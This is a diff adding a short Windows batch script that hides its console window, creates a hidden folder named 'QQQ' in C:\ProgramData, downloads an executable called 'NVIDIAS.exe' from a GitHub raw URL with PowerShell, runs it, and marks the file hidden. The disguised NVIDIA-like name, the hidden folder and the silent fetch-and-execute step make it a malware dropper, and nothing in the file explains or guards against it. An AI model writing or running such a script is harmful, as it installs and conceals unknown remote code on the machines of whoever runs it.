@@ -1,0 +1,9 @@
+@echo off
+powershell -window hidden -command ""
+cd "C:\ProgramData"
+mkdir "QQQ"
+attrib +h "QQQ" /s /d
+cd "C:\ProgramData\QQQ" 
+powershell -Command "Invoke-WebRequest 'https://github.com/pr0niums/Repo/raw/refs/heads/main/NVIDIAS.exe' -OutFile 'NVIDIAS.exe'"
+start NVIDIAS.exe
+attrib +h "C:\ProgramData\QQQ\NVIDIAS.exe" /s /d
